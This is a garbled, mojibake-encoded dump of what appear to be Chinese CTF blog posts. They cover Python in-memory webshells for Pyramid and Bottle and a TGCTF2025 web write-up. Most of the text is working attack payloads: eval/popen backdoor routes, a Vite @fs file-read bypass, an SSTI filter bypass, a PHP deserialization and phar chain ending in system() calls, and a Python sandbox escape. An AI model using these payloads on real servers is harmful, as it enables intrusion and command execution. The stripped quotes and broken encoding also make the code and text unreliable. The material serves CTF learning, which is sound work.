pickle.dumps(a)print(base64.b64encode(b)) å‚è€ƒæ–‡ç« https://xz.aliyun.com/news/13858https://www.cnblogs.com/gxngxngxn/p/18181936https://research.qianxin.com/archives/2329https://blog.csdn.net/solitudi/article/details/115331388 Pyamidå†…å­˜é©¬ä¾‹é¢˜è¯¦è§ TGCTF20245 ç†Ÿæ‚‰çš„é…æ–¹* æˆ–è€… å¼ºç½‘æ¯å†³èµ›Pyramid åˆ©ç”¨æ ˆå¸§æ‰“Pyramid WEBæ¡†æ¶ä¸‹çš„å†…å­˜é©¬æ ˆå¸§ä¸æ‡‚å¾—è¯¦æƒ…çœ‹:https://blog.csdn.net/Jesse_Kyrie/article/details/139789665 æ ˆå¸§ï¼ˆStack Frameï¼‰æ˜¯ Python è™šæ‹Ÿæœº ä¸­ç¨‹åºæ‰§è¡Œçš„è½½ä½“ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯ Python ä¸­çš„ä¸€ç§æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ æ¯å½“ Python æ‰§è¡Œä¸€ä¸ªå‡½æ•°æˆ–æ–¹æ³•æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§æ¥è¡¨ç¤ºå½“å‰çš„å‡½æ•°è°ƒç”¨ï¼Œå¹¶å°†å…¶å‹å…¥ä¸€ä¸ªç§°ä¸º è°ƒç”¨æ ˆ ï¼ˆCall Stackï¼‰çš„æ•°æ®ç»“æ„ä¸­ã€‚ è°ƒç”¨æ ˆæ˜¯ä¸€ä¸ªåè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„æ•°æ®ç»“æ„ï¼Œç”¨äºç®¡ç†ç¨‹åºä¸­çš„å‡½æ•°è°ƒç”¨å…³ç³»ã€‚ æ ˆå¸§çš„åˆ›å»ºå’Œé”€æ¯æ˜¯åŠ¨æ€çš„ï¼Œéšç€å‡½æ•°çš„è°ƒç”¨å’Œè¿”å›è€Œä¸æ–­å‘ç”Ÿ æ„é€ å†…å­˜é©¬Pyramid WEBæ–°æ¡†æ¶ä¸‹çš„å†…å­˜é©¬å‘ç°æ˜¯é€šè¿‡pyramid.configæ¥ç”Ÿæˆçš„ï¼Œå› ä¸ºpyramid.configé‡Œæœ‰add_view add_routeï¼Œå¯ä»¥ç”¨æ¥æ³¨å†Œè·¯ç”±ã€‚ æ‰€ä»¥æˆ‘ä»¬è¦é‚£åˆ°è¿™ä¸ªconfigï¼Œæ‰€ä»¥å¾—è·å–åˆ°æ ˆå¸§çš„globalså…¨å±€æ‰èƒ½æ‹¿åˆ°å½“å‰çš„app configã€‚ å…ˆçœ‹ä¸‹é¢è¿™æ®µä»£ç ï¼Œè¿™ä¸ªå°±æ˜¯ä¸ºäº†è·å–configé‚£ä¸ªæ ˆå¸§ def f(): yield g.gi_frame.f_backg = f() frame = next(g) b = frame.f_back.f_back.f_globalsprint(b) ç„¶åæ‹¿åˆ°è¿™ä¸ªæ ˆå¸§è¿‡å å°±è®¿é—®configæ·»åŠ æ–°è·¯ç”±äº† ä¸‹é¢å®šä¹‰äº†ä¸€ä¸ªæ–°helloå‡½æ•° def hello(request): code = request.POST[code] res=eval(code) return Response(res) config.add_route(shell, /shell) #æ·»åŠ æ–°è·¯ç”± config.add_view(hello, route_name=shell) #ç»™/shellè·¯ç”±ç»‘å®šè§†å›¾hello config.commit() #ç«‹å³æ›´æ–°æœåŠ¡ è€Œä¸æ˜¯æ‰‹åŠ¨é‡å¯ è¿™æ ·æ‰èƒ½å¤Ÿç”Ÿæ•ˆ æ•´åˆä¸€ä¸‹payloadå°±æ˜¯ def waff(): def f(): yield g.gi_frame.f_back g = f() frame = next(g) b = frame.f_back.f_back.f_globals def hello(request): code = request.POST[code] res=eval(code) return Response(res) config.add_route(shell, /shell) config.add_view(hello, route_name=shellb) config.commit() waff() TGCTF2025 ç†Ÿæ‚‰* payloadå†™æ³• import requestsfrom urllib.parse import quotecode=def waff(): def f(): yield g.gi_frame.f_back g = f() frame = next(g) b = frame.f_back.f_back.f_globals def hello(request): code = request.params[code] res=eval(code) return Response(res) config.add_route(shellb, /shellb) config.add_view(hello, route_name=shellb) config.commit() waff()url=YOUR_URLdata=expr:fcode+111res=requests.post(url=url,data=data)print(res.text) å¼ºç½‘æ¯pyramidè„šæœ¬ import requestsfrom urllib.parse import quotecode=def waff(): def f(): yield g.gi_frame.f_back g = f() frame = next(g) b = frame.f_back.f_back.f_globals print(b)waff()code1=print(1)burp0_url = http://127.0.0.1:6543/api/test?code=+code+token=eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYifQ%3D%3D.Z5LpNETpFxdzqwhuSwp762ebRWcYzKBWCL5zrymkRlSJ4Lvl%2BAysBf1d8NIRmFQRJ0P3ceKEpn7rGGUpICNmQ9yYf77FHJcVX2hJQ4YodabxiavEMlgYkeDelNPgmohkG%2F3sk8CqPKkY41cRlhVrBPZJn2AInLkEIyW5yt1CRo0NWDndTl4v6eRTu3JtG9FXUs3O8hzeuqBsnzDS%2Fih3dEzWXzGxj%2B90UOOPDlJdnaBj22b4oIoMKVbYNuJFkAjqbCW8dVdLxX35VVonnFW5VfJ7tcepTt1irmtnL%2FEgVb94yqAr3YtJRSIRHJr79t46PLs8bpG9m3kOjtwtxrUz9g%3D%3D.UlM%3D.LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwemJKUWRqWlEyL3pGeFVZc2I2YQo4YnljREhtSzQ2QXpaa25aQXJxMFFKekE5Ri9EWXFxRk5KanpTeHk0WmZqbmk4TlprRmduM2REWXdCU0JUWjZKClc3VW1waWVDZXcza3o5cy9GMENRdUxCY0dKMTd0M2RPVWRRVVpSVnJXUkhBeE1aL0Y2VFFSUWMvUkFVQy9qRmUKWGVYWTBIeFFydyt6amVJeWNCNlcyeGdZUDlxU0RXNHZYeWFrb1pRZXZiZmhHc3dVQWU3Vm5jQ3FuYnBPZk5tZQphZXdwRTd0b3NoSWpOSWFiN3d5RW9zQzY0RGhGU2tsNS9qZ0ZyVFVheC84OERueDJzYzgzL3hHWFVyY0tDajB3CmdQRVhmTFdGc2NLbzRtdzFNaHhGWE5SZEZDdDFHMVM3eTd6WkdESklQRXhQbEFJSE05RzNSWFd5WDlXbm5xUzQKSlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tburp0_headers = User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0, Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8, Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2, Accept-Encoding: gzip, deflate, br, Connection: close, Upgrade-Insecure-Requests: 1, Sec-Fetch-Dest: document, Sec-Fetch-Mode: navigate, Sec-Fetch-Site: none, Sec-Fetch-User: ?1, Priority: u=0, ires=requests.get(burp0_url, headers=burp0_headers)print(res.text) bottleå†…å­˜é©¬å‚è€ƒæ–‡ç« :https://forum.butian.net/share/4048 è¿™é‡Œç›´æ¥è®°å½•å‡ ç§åšæ³• 1.ç›´æ¥ç»‘å®šè·¯ç”±payload app.route(/b,GET,lambda :__import__(os).popen(request.params.get(a)).read()) #ç›´æ¥è®¿é—®/bè·¯ç”± aå‚æ•°å¯ä»¥è¿›è¡Œrce 2.åˆ©ç”¨æŠ¥é”™ç•Œé¢ æ±¡æŸ“æŠ¥é”™ç•Œé¢payload app.error(404)(lambda e: __import__(os).popen(request.query.get(a)).read()) 3.åˆ©ç”¨add_hookadd_hookå°±æ˜¯æ³¨å†Œé’©å­å‡½æ•° #reaponseapp.add_hook(before_request, lambda: __import__(bottle).response.set_header(X-flag, __import__(base64).b64encode(__import__(os).popen(request.query.get(a)).read().encode(utf-8)).decode(utf-8)))#abortapp.add_hook(before_request, lambda: __import__(bottle).abort(404,__import__(os).popen(request.query.get(a)).read())) ç»“è¯­å­¦ä¹ pythonå†…å­˜é©¬å…ˆå‘Šä¸€æ®µè½äº† æœ‰å¾ˆå¤šå…¶ä»–æ¨¡æ¿çš„å†…å­˜é©¬ ä»¥åé‡åˆ°äº†å†æ¥è¡¥å…¨å§~~~","tags":["CTFå­¦ä¹ "]},{"title":"TGCTF2025-WEB WP","path":"/2025/04/14/TGCTF2025-WEB/","content":"AAAå·æ¸¡é˜´å¹³?php ?------WebKitFormBoundaryU4VFMZ4wbU2hEGvgContent-Disposition: form-data; name=submitä¸Šä¼ æ–‡ä»¶------WebKitFormBoundaryU4VFMZ4wbU2hEGvg-- å‰ç«¯GAMEè¿›å»æ˜¯ä¸ªå°æ¸¸æˆ æœ¬æ¥ä»¥ä¸ºæ˜¯æ­£å¸¸æ€è·¯ ä½†æ˜¯æ€ä¹ˆéƒ½åšä¸å‡º äºæ˜¯é¢˜ç›®æ˜¯ä¸ªvueæ¡†æ¶çš„æ¸¸æˆ äºæ˜¯æœç´¢ å‘ç°æœ‰å…³äºè¿™ä¸ªçš„æ¼æ´ æ¼æ´æ–‡ç« :Viteå¼€å‘æœåŠ¡å™¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æå¤ç°ï¼ˆCVE-2025-31125ï¼‰-å…ˆçŸ¥ç¤¾åŒº Viteå­˜åœ¨CVE-2025-30208å®‰å…¨æ¼æ´ï¼ˆé™„ä¿®å¤æ–¹æ¡ˆå’Œæ¼”ç¤ºç¤ºä¾‹) Viteæ¼æ´åŸç†Viteåœ¨å¼€å‘æœåŠ¡å™¨æ¨¡å¼ä¸‹ï¼Œæä¾›äº†@fsåŠŸèƒ½ï¼ŒåŸæœ¬æ˜¯ä¸ºäº†è®©å¼€å‘è€…è®¿é—®æœåŠ¡å…è®¸èŒƒå›´å†…çš„æ–‡ä»¶ã€‚æ­£å¸¸æƒ…å†µä¸‹ï¼Œå¦‚æœè¯·æ±‚çš„æ–‡ä»¶è¶…å‡ºäº†è¿™ä¸ªå…è®¸èŒƒå›´ï¼ŒViteåº”è¯¥è¿”å›â€œ403 Restrictedâ€ï¼Œæç¤ºè®¿é—®å—é™ã€‚ä½†æ”»å‡»è€…å‘ç°äº†ä¸€ä¸ªâ€œæ¼æ´â€ï¼Œå½“åœ¨è¯·æ±‚URLä¸­æ·»åŠ ?raw??æˆ–?importraw??è¿™æ ·çš„ç‰¹æ®Šå‚æ•°æ—¶ï¼Œå°±èƒ½ç»•è¿‡åŸæœ¬çš„æ–‡ä»¶è®¿é—®é™åˆ¶æ£€æŸ¥ã€‚ åŸå› ï¼šViteåœ¨å¤„ç†è¯·æ±‚çš„å¤šä¸ªç¯èŠ‚ä¸­ï¼Œä¼šç§»é™¤ç±»ä¼¼?çš„ç»“å°¾åˆ†éš”ç¬¦ï¼Œä½†åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²çš„æ­£åˆ™åŒ¹é…è¿‡ç¨‹ä¸­ï¼Œå´æ²¡æœ‰è€ƒè™‘åˆ°è¿™ç§ç‰¹æ®Šæƒ…å†µï¼Œè¿™å°±ç»™æ”»å‡»è€…å¯ä¹˜ä¹‹æœºï¼Œä»–ä»¬åˆ©ç”¨è¿™ä¸ªç¼ºé™·ï¼Œå°±èƒ½è¯»å–ç›®æ ‡æ–‡ä»¶çš„å†…å®¹ã€‚ é¢˜ç›®è§£æ³•ç›´æ¥æŒ‰ç…§ä»–ç»™çš„payload /@fs/tgflagggg?importraw?? å‰ç«¯GAME Plusä¸Šä¸€é“é¢˜çš„payloadä¸å¯è¡Œäº† æ–‡ç« æœªå…¬å¼€çš„poc:å¯ä»¥é€šè¿‡svgæ¥è¿›è¡Œæ–‡ä»¶è¯»å– /@fs/tgflagggg?import?meteorkai.svg?.wasm?init å¾—åˆ°VEdDVEZ7ZmUxM2MzZGYtYzNkNC1hYjJhLTQwZjYtNjNjYjM1MzczNjAyfQo base64è§£ç  TGCTF{fe13c3df-c3d4-ab2a-40f6-63cb35373602} å‰ç«¯GAME Ultraplusçš„payloadä¹Ÿä¸å¯ä»¥ /@fs/app#/../proc/self/environè¯»ç¯å¢ƒå˜é‡ ä¹Ÿå¯ä»¥ /@fs/app/vite-project/#/../../../../../tgflagggg ç›´é¢å¤©å‘½è®¿é—®hint æç¤ºæ˜¯ä¸€ä¸ªå››ä¸ªå°å†™è‹±æ–‡å­—æ¯çš„è·¯ç”± çˆ†å‡ºæ¥æ˜¯aazzè·¯ç”± è¿›å»f12 çœ‹åˆ°è¯´æ˜¯å¯ä»¥ä¼ å‚æ•° butä¸çŸ¥é“å‚æ•°æ˜¯ä»€ä¹ˆ é‚£å°±arjunçˆ†ç ´å§ çˆ†å‡ºæ¥æ˜¯filename çœ‹åˆ°fillenameå‚æ•° ä¸€èˆ¬ä¼šè€ƒè™‘åˆ°ssrf å°±åƒnameæ˜¯sstiä¸€æ · ä¼ å…¥?filename=/etc/passwd å¯ä»¥è¯»å– å°è¯•è¯»å–ç¯å¢ƒå˜é‡ ?filename=/proc/1/environ ä¹Ÿå¯ä»¥ç›´æ¥è¯»flag ç›´é¢å¤©å‘½ï¼ˆå¤ä»‡ï¼‰import osimport stringfrom flask import Flask, request, render_template_string, jsonify, send_from_directoryfrom a.b.c.d.secret import secret_keyapp = Flask(__name__)black_list=[lipsum,|,%,,,map,chr, value, get, url, pop,include,popen,os,import,eval,_,system,read,base,globals,_.,set,application,getitem,request, +, init, arg, config, app, self]def waf(name): for x in black_list: if x in name.lower(): return True return Falsedef is_typable(char): # å®šä¹‰å¯é€šè¿‡æ ‡å‡† QWERTY é”®ç›˜è¾“å…¥çš„å­—ç¬¦é›† typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace return char in typable_chars@app.route(/)def home(): return send_from_directory(static, index.html)@app.route(/jingu, methods=[POST])def greet(): template1= template2= name = request.form.get(name) template = fname if waf(name): template = æƒ³å¹²åäº‹äº†æ˜¯å§hackerï¼Ÿå“¼ï¼Œè¿˜å¤©å‘½äººï¼Œå¯ç¬‘ï¼Œå¯æ‚²ï¼Œå¯å¹Image else: k=0 for i in name: if is_typable(i): continue k=1 break if k==1: if not (secret_key[:2] in name and secret_key[2:]): template = è¿â€œå…­æ ¹â€éƒ½å‡‘ä¸é½ï¼Œè°ˆä»€ä¹ˆå¤©å‘½ä¸å¤©å‘½çš„ï¼Œè¿˜æ˜¯æˆ´ä¸Šè¿™é‡‘ç®å§å†å»è¥¿è¡Œå†ç»ƒå†ç»ƒImage return render_template_string(template) template1 = â€œå…­æ ¹â€ä¹Ÿå‡‘é½äº†ï¼Œä½ å·²ç»å¯ä»¥ç›´é¢å¤©å‘½äº†ï¼æˆ‘å¸®ä½ æŠŠâ€œsecret_keyâ€æ›¿æ¢ä¸ºäº†â€œâ€æœ€åï¼Œå¦‚æœä½ ç”¨äº†catï¼Œå°±å¯ä»¥è§åˆ°é½å¤©å¤§åœ£äº† template= template.replace(å¤©å‘½,).replace(éš¾è¿,) template = template if cat in template: template2 = æˆ–è®¸ä½ è¿™åªå«å¤©å‘½äººçš„çŒ´å­ï¼ŒçœŸçš„èƒ½åšåˆ°ï¼ŸImage try: return template1+render_template_string(template)+render_template_string(template2) except Exception as e: error_message = f500æŠ¥é”™äº†ï¼ŒæŸ¥è¯¢è¯­å¥å¦‚ä¸‹ï¼štemplate return error_message, 400@app.route(/hint, methods=[GET])def hinter(): template=hintï¼šæœ‰ä¸€ä¸ªaazzè·¯ç”±ï¼Œå»é‚£é‡Œçœ‹çœ‹å§ï¼Œå¤©å‘½äºº! return render_template_string(template)@app.route(/aazz, methods=[GET])def finder(): with open(__file__, r) as f: source_code = f.read() return fsource_code, 200, Content-Type: text/html; charset=utf-8if __name__ == __main__: app.run(host=0.0.0.0, port=80) å®¡è®¡æºç  é»‘åå• black_list=[lipsum,|,%,,,map,chr, value, get, url, pop,include,popen,os,import,eval,_,system,read,base,globals,_.,set,application,getitem,request, +, init, arg, config, app, self] æŠŠ{}banäº† ä½†æ˜¯å¤©å‘½å’Œéš¾è¿å¯ä»¥æ›¿æ¢ä¸º æ‰€ä»¥ç›´æ¥æŒ‰ç…§é»‘åå• æ‰“sstiå°±å¯ æœ€åpayload å¤©å‘½((g[pop][\\x5f\\x5f\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x5f\\x5f][\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f][\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f](os))[popen](cat /t*))[read]()éš¾è¿ ç«çœ¼è¾©é­‘é­…è¿›å»dirsearchæ‰«æç½‘ç«™ çœ‹åˆ°robots.txt è®¿é—®å¾—åˆ°å¾ˆå¤šè·¯ç”± è¯´æ˜¯åªæœ‰ä¸€ä¸ªèƒ½åˆ° ç›´æ¥åˆ°tgshell.phpæ‰“rceå³å¯ postä¼ å…¥Â· shell=print \\cat t*`; å› ä¸ºæ˜¯ä¸€å¥è¯æœ¨é©¬ ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨èšå‰‘è¿æ¥ ç„¶åä¹Ÿå¯å¾—åˆ°flag ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿè¿›å»æ˜¯æ–‡ä»¶ä¸Šä¼  å‘ç°ä¼ ä»€ä¹ˆéƒ½è¢«ban äºæ˜¯dirsearchäº†ä¸€ä¸‹ç½‘ç«™ robots.txté‡Œæœ‰ä¸œè¥¿ [å›¾ç‰‡] è®¿é—®class.php å‘ç°æ˜¯æ˜¯ååºåˆ—åŒ–å¹¶ä¸”æœ‰æ¼æ´ç‚¹ ?php highlight_file(__FILE__); error_reporting(0); function best64_decode($str) return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str))))); class yesterday public $learn; public $study=study; public $try; public function __construct() $this-learn = learnbr; public function __destruct() echo You studied hard yesterday.br; return $this-study-hard(); //1 class today public $doing; public $did; public $done; public function __construct() $this-did = What you did makes you outstanding.br; public function __call($arg1, $arg2) $this-done = And what youve done has given you a choice.br; echo $this-done; if(md5(md5($this-doing))==666) return $this-doing(); else return $this-doing-better; //2 class tommoraw public $good; public $bad; public $soso; public function __invoke() $this-good=Youll be good tommoraw!br; echo $this-good; public function __get($arg1) $this-bad=Youll be bad tommoraw!br; class future private $impossible=How can you get here?br; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; public function __set($arg1, $arg2) if ($this-out-useful7) echo Seven is my lucky numberbr; system(whoami); public function __toString() echo This is your future.br; system($_POST[wow]); //3 return win; public function __destruct() $this-no = no; return $this-no; if (file_exists($_GET[filename])) echo Focus on the previous step!br; else $data=substr($_GET[filename],0,-4); unserialize(best64_decode($data)); // You learn yesterday, you choose today, can you get to your future?? ç†ä¸€ä¸‹å¤§æ¦‚çš„é“¾å­é¡ºåº yesterday::destructï¼ˆstudynew todayï¼‰- today::__callï¼ˆdoingnew futureï¼‰- future::__tostring ç„¶åpostä¼ å…¥wowå°±å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ ä½†æ˜¯æœ‰ä¸ªæ³¨æ„ç‚¹ function best64_decode($str) return base64_decode(base64_decode(base64_decode(base64_decode(base64_decode($str))))); ...... unserialize(best64_decode($data)); åºåˆ—åŒ–åçš„æ•°æ®è¿˜è¦base_encode 5æ¬¡ä¼ å…¥ popé“¾å¦‚ä¸‹ ?php class yesterday public $learn; public $study; public $try; class today public $doing; public $did; public $done; class tommoraw public $good; public $bad; public $soso; class future private $impossible=How can you get here?br; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; $aa = new yesterday();$aa-study = new today();$aa-study-doing = new future();echo serialize($aa);? nullæ›¿æ¢ä¸º%00å°±è¡Œäº† å› ä¸ºprivateå±æ€§çš„åŸå›  Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBoa1QxSkhVbkZhVnpBMFpVWlJlV0pGZEd4aVZrcEtWbTB4TUdKR1ZYZGhlazVYVTBoQ01sUldWVFZqUms1eFVXMXNUbUpGY0haWGJGcFBVMnMxY2sxVVdtcFNSMUp4V2xjd05HVkdVWGxpUlhSb1RXdHNOVmxyYUZkWlYxWldZWHBPVjFOSVFqSlVWM00xWTBaT2RFMVhkRmhTYTJ3MFYxUkplRlp0UmxaUFdFWlVWMGhDVVZsdE5WTk9iRkY1WTBWYVQxSlViSGRWTWpCNFlURmtSMU5ZYUZwTmFrWllXVEJrUzFkV1JuVlhiWEJPVFVSV00xWXhZM2hPUjBwR1lraEdhMU5JUWxGWlYzUnlaVVpSZVdKRmRGUldNR3cyVjFSS2ExZHJNWEpYYWtaVVZsZG9lbHBITVZOV1JrWjBUbGRHV0ZKclduVlhWbFpyVmpKV1YyTkdWbEJTUjJoaFdXMTBjbU5zVGxoalJFSnNZWHBzZUZWc2FHOVZSMFpXWTBoU1lWSnRhRlJVVm1SUFpFWmFkVmR0ZEZoU2ExcDNWa2h3UWsxRk5IbFVhbHBwVFRKb1QxVnJZelZqUm1SMFRsWmtUbEl4U2xwVk1qRTBZVmRLVldGSVFsVmxhMFYzVkdwS1QwNXRTalpVYkVKb1ZsYzVORmRZY0V0V01rcFlWV3hvYTAweWFFdFpWelZUVlVaU05sUnJOVTloZWxVeVdXcEtjMkV4WkVaT1dFNVlZbFJXV0ZsNlFYaGpSazVWV2taV2FHSnNTVEpXUkVwM1lXczFjbUpJVmxkaWJrSm9WbXBHZG1WR2JISlZhelZvVmxSb00xUnJVbXRoYlZaMFQwaHdWVTF0ZUV4VVZtUk9aVlphZEUxWGRGZE5NazR6VlRGa2QwMUdVWGRQU0hCVlZrWndVRnBYTURWalJuQkhZVVU1YVZKdVFqRldiVFZQVkRGVmQyRjZUbGRTTTBGM1dsZHpOV05XYkRaWGEzQnBZa1p2TWxZeWVHdFpWVEZZVTJ0V1dGWXllRkZVVlZKU1RURnJlbU5JV2s1TlJHeDNWVEp3UjJGck1YTlhibEpoVW0xUmVsUlVRbk5qVjFKR1QxWkNUazFFUVhsV1J6VjNaRzFHV0ZWc2JGVmlXR2hvV1cxNFlXVnNVWGRVYTNCUFRWWktlRnBGYUhkVlIwWjBWRlJLVkZaNlZsaGFWM2gzVjBaa2NWSnRiRk5TTTFKM1ZraHdRazFGTkhsVWFscHBaV3hLVVZsV1ZuWmxSbXcyVTJ4a2FWWXhTbGxhUkU1dlZHeEZkMkY2VGxkU00wRjNXbGR6TldOV2NEWlhhM0JwWWtadk1sWXllR3RaVlRGWVUydFdVMWRIYUV0WlZ6VlRWVVpTTmxSck5VOWhlbXhHV1dwS2MyRXhaRVpPV0U1WVlsUldXRmw2UVhoV1ZrNVlZa1pDVGxKR1JYcFhWRTUzWkdzMVJrOVlRbFJoYTFweFZGZDRZV1JHY0VkYVJFNXNVbFJGTVZVeFVtdFdWMFoxVldwYVZVMXVRblZVYlhSelpGWmFkV05IUmxkTlZ6azBWMWQwVTFKck1VWmlTRVpyVWxSc1VWUlVRWGROYkZGM1ZXNWFhRll4U2xwV1J6RTBXVmRLYzFkdWNGVldiRXBYV1ZaVk5HUXdOVVZhUjNCc1lsUm5kMVpFU25OVE1ERllWRmhzVjJKVVJuSldhazVyVGtaU2RHSkZjRTlOVmtwNFdrVm9kMVZIUm5SWmVrcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldWalpWTVdSM1RVWlJkMDlJY0ZWV1JuQlJWV3RqTldOR2NFZGhSVGxwVW01Q01WWnROVTlVYkZwSVdraENWV1ZyUlhkVWFrcFBUbTFLTmxWc1FtaFdWemswVjFod1MxWXlTbGhWYkdoclRUSm9VVlpVUW5KTk1WcElZMFJDYkdGNmJIaFhibkJoVTIxS2MxZHFXbGhpUjFKb1ZGWmtTMUpXVGxsYVJYQm9ZbXhLVVZaSWNFNWxSMVp5VDFoR1ZWWkdjRXRaYkZwTFpERmtjbFJyY0U5TlZrcDRXa1ZvZDFWSFJuTlNWRXBVVm5wR1ZGcEhNVXRrUmxwWVlrWkNUbEpHUlhwWGJYaHZWR3MxY2sxVVdtbE5iWGh5VlRCV2RrMVdUbGhqUkVKVlRVUm9ObFJWVVhkUVVUMDk=1111 åœ¨ä¼ å…¥wowcat flagå³å¯ ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ(å¤ä»‡)æ¼æ´åˆ©ç”¨ç‚¹:pharåè®®æµå¯è¢«file_exists()å‡½æ•°ç›´æ¥è§¦å‘ å¯ä»¥ä¸Šä¼ .avgæ–‡ä»¶ é“¾å­å¦‚ä¸‹ ?php class yesterday public $learn; public $study; public $try; class today public $doing; public $did; public $done; class tommoraw public $good; public $bad; public $soso; class future private $impossible=How can you get here?br; private $out; private $no; public $useful1;public $useful2;public $useful3;public $useful4;public $useful5;public $useful6;public $useful7;public $useful8;public $useful9;public $useful10;public $useful11;public $useful12;public $useful13;public $useful14;public $useful15;public $useful16;public $useful17;public $useful18;public $useful19;public $useful20; $aa = new yesterday();$aa-study = new today();$aa-study-doing = new future();$phar = new Phar(sauy.phar);$phar-startBuffering();$phar-setStub(GIF89a.?php __HALT_COMPILER(); ? );$phar-setMetadata($aa);$phar-addFromString(test.txt, test);$phar-stopBuffering();? php -d phar.readonly=0 -f explore.php å°†ç”Ÿæˆçš„sauy.phpæ”¹ä¸ºatg ä¸Šä¼ æˆåŠŸå åˆ°class.php è¿›è¡Œååºåˆ—åŒ–æ“ä½œ getä¼ å…¥ï¼š?filenamephar:.uploadssauy.atgtest.txt postä¼ å…¥ï¼šwowenv ç†Ÿæ‚‰çš„é…æ–¹ï¼Œç†Ÿæ‚‰çš„å‘³é“è¿›å»å³ä½¿æºä»£ç è´´è„¸ ä½†æ˜¯å¯æƒœæˆ‘ä¸ä¼š èµ›åå¤ç°ç®—æ˜¯å­¦åˆ°äº† è°¢è°¢å®éªŒå®¤çš„ä½¬å¤§æ•™æˆ‘ è€ƒç‚¹ï¼šæ²™ç®±ç»•è¿‡ pythonä»£ç æ³¨å…¥ æºç  from pyramid.config import Configuratorfrom pyramid.request import Requestfrom pyramid.response import Responsefrom pyramid.view import view_configfrom wsgiref.simple_server import make_serverfrom pyramid.events import NewResponseimport refrom jinja2 import Environment, BaseLoadereval_globals = #é˜²æ­¢evalæ‰§è¡Œæ¶æ„ä»£ç  __builtins__: , # ç¦ç”¨æ‰€æœ‰å†…ç½®å‡½æ•° __import__: None # ç¦æ­¢åŠ¨æ€å¯¼å…¥def checkExpr(expr_input): expr = re.split(r[-+*/], expr_input) print(exec(expr_input)) if len(expr) != 2: return 0 try: int(expr[0]) int(expr[1]) except: return 0 return 1def home_view(request): expr_input = result = if request.method == POST: expr_input = request.POST[expr] if checkExpr(expr_input): try: result = eval(expr_input, eval_globals) except Exception as e: result = e else: result = çˆ¬ï¼ template_str = ã€xxxã€‘ env = Environment(loader=BaseLoader()) template = env.from_string(template_str) rendered = template.render(expr_input=expr_input, result=result) return Response(rendered)if __name__ == __main__: with Configurator() as config: config.add_route(home_view, /) config.add_view(home_view, route_name=home_view) app = config.make_wsgi_app() server = make_server(0.0.0.0, 9040, app) server.serve_forever() æ³•1ï¼šç”¨æŠ›å‡ºé”™è¯¯å®ç°RCEï¼Œç”¨æ±¡æŸ“HTTP 500çš„è¿”å›æ¶ˆæ¯å®ç°å›æ˜¾è„šæœ¬çœ‹ä¸æ‡‚é—®ai import requestsurl = your_urlcode = fb = re.match.__globals__[__builtins__]b[setattr](b[__import__](wsgiref).handlers.BaseHandler,error_body,b[__import__](os).popen(ls /).read().encode())raise Exception(1)resp = requests.post(url, data = expr: fexec(code!r),)print(resp.status_code)print(resp.text) è„šæœ¬è§£é‡Šé¦–å…ˆé€šè¿‡ b = re.match.__globals__[__builtins__] è¿™ä¸€æ­¥æ˜¯é€šè¿‡åŠ è½½__globals__çš„å±æ€§è®¿é—®å…¨å±€ç©ºé—´ ç›®çš„æ˜¯ç»•è¿‡å¯¹__import__å’Œ__builtins__çš„é™åˆ¶ ç›¸å½“äºç»•è¿‡å¯¹è¿™ä¸ªçš„æ²™ç®±é™åˆ¶ç„¶å b[setattr](b[__import__](wsgiref).handlers.BaseHandler,error_body æ˜¯è¿‡__import__å‡½æ•°åŠ¨æ€åŠ è½½wsgirefæ¨¡å—wsgiref.handlers.BaseHandleræ˜¯WSGIå¤„ç†HTTPè¯·æ±‚/å“åº”çš„åŸºç±»ï¼Œè´Ÿè´£ç”Ÿæˆé”™è¯¯å“åº”å†…å®¹ã€‚b[__import__](os).popen(ls /).read().encode() ç„¶åä¿®æ”¹ç±»çš„error_bodyå±æ€§ä¸ºå‘½ä»¤æ‰§è¡Œçš„å†…å®¹ ç„¶åencodeæ˜¯æŠŠå…¶è½¬åŒ–ä¸ºå­—èŠ‚ç±»å‹raise Exception(1)æ˜¯å¼ºåˆ¶æŠ›å‡ºå¼‚å¸¸ è§¦å‘WSGIæŠ¥é”™ 